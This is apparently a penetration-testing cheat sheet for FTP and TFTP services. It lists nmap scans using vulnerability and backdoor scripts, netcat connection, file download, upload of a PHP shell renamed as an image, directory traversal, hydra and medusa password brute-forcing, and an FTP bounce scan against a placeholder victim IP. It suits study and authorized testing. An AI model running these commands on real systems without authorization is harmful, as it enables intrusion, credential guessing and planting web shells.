### FTP:
FTP protocol is used to transfer files from one machine to another machine

##### nmap:
- nmap -p 21 -sV [victim_ip]
- nmap -sV -sC [victim_ip] -p 21
- namp --script=ftp-anon,ftp-bounce,ftp-libopie,ftp-proftpd-backdoor,ftp-vsftpd-backdoor,ftp-vuln-cve2010-4221,tftp-enum,ftp-default,ftp-user-enum -p [victim_ip]

##### Connect to a FTP server
- nc -nv [victim_ip] [port]

##### Download attemps
- ftp> GET boot.ini
- ftp> get boot.ini
- ftp> mget boot.ini
- ftp> get boot.ini file_name

##### Upload attemps
- ftp> put shell.php shell.jpg
- ftp> PUT shell.php shell.jpg
- ftp> send 
    (local-file) shell.php
    (remote-file) shell.jpg
    
##### File Traversal
- dir ../
- ls ../

##### Brute force
- medusa -h [victim_ip] -u user -P passwords.txt -M ftp 
- hydra -s [port] -C ./wordlists/ftp-default-userpass.txt -u -f [victim_ip] ftp

##### Windows dir change with ~1
```
cd /Docume~1/
cd /Progra~1/
```
##### FTP Bounce Scan
nmap –top-ports 1000 -vv -Pn -b anonymous:password@[victim_ip:21] 127.0.0.1

##### TFTP (udp:69)
nmap -oN tftp.nmap -v -sU -sV -T2 –script tftp* -p 69 [victim_ip]

